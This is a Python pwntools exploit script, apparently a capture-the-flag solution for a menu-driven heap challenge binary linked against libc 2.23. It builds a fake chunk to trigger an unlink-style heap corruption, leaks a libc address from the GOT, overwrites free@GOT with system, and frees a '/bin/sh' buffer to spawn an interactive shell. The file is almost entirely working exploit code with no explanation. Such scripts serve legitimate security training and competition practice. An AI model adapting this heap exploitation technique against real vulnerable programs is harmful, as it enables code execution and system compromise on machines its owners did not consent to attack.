from pwn import *
from LibcSearcher import *

p = process("./service")
elf = ELF("./service")
libc = ELF("./libc-2.23.so")
ru = lambda x: p.recvuntil(x)
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)


def debug():
    gdb.attach(p, "")
    raw_input()


def touch(sz):
    ru("please chooice :")
    sl("1")
    ru("please input the size :")
    sl(str(sz))


def delete(idx):
    ru("please chooice :")
    sl("2")
    ru("which node do you want to delete")
    sl(str(idx))


def show(idx):
    ru("please chooice :")
    sl("3")
    ru("which node do you want to show")
    sl(str(idx))
    return ru("1. touch")


def take_note(idx, con):
    ru("please chooice :")
    sl("4")
    ru("which one do you want modify :")
    sl(str(idx))
    ru("please input the content")
    sd(con)


def exploit():
    buf_addr = 0x00000000006020C0
    touch(0x30)  # 0
    touch(0x30)  # 1
    touch(0x30)  # 2
    touch(0x30)  # construct fake chunk
    touch(0x90)  # free this chunk
    touch(0x30)  # avoid malloc_conslidate
    # note_payload fake chunk

    note_payload = p64(0) + p64(0x31) + p64(buf_addr)
    note_payload += p64(buf_addr + 0x8)
    note_payload += b"a" * 0x10
    note_payload += p64(0x30)
    note_payload += p64(
        0xA0
    )  # bypass double free (!prev)  this_chunk + size --> prev_inuse bit

    take_note(3, note_payload)

    delete(4)
    take_note(3, p64(elf.got["__libc_start_main"]))
    leak_got = show(0).split(b"\n")[2]
    leak_got = leak_got.ljust(8, b"\x00")
    leak_got = u64(leak_got)
    success("leak_got == > " + hex(leak_got))
    obj = libc.sym["__libc_start_main"]
    libc_base = leak_got - obj
    success("libc_base == > " + hex(libc_base))
    system = libc_base + libc.sym['system']
    success("system == > " + hex(system))
    take_note(3, p64(elf.got["free"]))  # modify index 0 point
    take_note(2, "/bin/sh\x00")
    take_note(0, p64(system))
    delete(2)

    p.interactive()
    # debug()


if __name__ == "__main__":
    exploit()
